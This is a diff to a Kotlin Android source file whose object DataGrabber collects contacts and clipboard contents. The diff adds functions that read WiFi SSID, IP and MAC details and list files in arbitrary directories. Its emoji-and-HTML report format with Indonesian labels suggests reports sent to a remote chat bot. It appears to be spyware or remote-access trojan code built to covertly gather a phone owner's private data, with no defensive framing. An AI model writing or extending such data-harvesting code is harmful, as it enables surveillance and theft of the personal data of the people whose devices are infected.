@@ -1,11 +1,13 @@
 package com.ghost.app
 import android.content.ClipboardManager
 import android.content.Context
+import android.net.wifi.WifiManager
 import android.os.Build
 import android.provider.CallLog
 import android.provider.ContactsContract
 import android.provider.Telephony
 import android.telephony.TelephonyManager
+import java.io.File
 object DataGrabber {
     fun contacts(ctx: Context): String {
         val sb = StringBuilder("📇 <b>Kontak</b>\n"); var count = 0
@@ -66,5 +68,26 @@ object DataGrabber {
             val clip = cm.primaryClip
             if (clip == null || clip.itemCount == 0) "📋 clipboard kosong" else "📋 <b>Clipboard</b>\n${clip.getItemAt(0).text}"
         } catch (e: Exception) { "📋 err: ${e.message}" }
+    }
+    fun wifiInfo(ctx: Context): String {
+        return try {
+            val wm = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
+            @Suppress("DEPRECATION") val info = wm.connectionInfo
+            "📶 <b>WiFi</b>\nSSID: ${info.ssid}\nIP: ${info.ipAddress}\nMAC: ${info.macAddress}"
+        } catch (e: Exception) { "📶 err: ${e.message}" }
+    }
+    fun listFiles(pathStr: String): String {
+        val dir = File(pathStr)
+        if (!dir.exists()) return "❌ Not found: $pathStr"
+        if (!dir.isDirectory) return "❌ Not a directory"
+        val sb = StringBuilder("📂 <b>Files in $pathStr</b>\n")
+        val files = dir.listFiles() ?: return "❌ Access denied"
+        var count = 0
+        for (f in files) {
+            if (count > 50) break
+            sb.append(if (f.isDirectory) "📁 " else "📄 ").append(f.name).append("\n")
+            count++
+        }
+        return sb.toString()
     }
 }
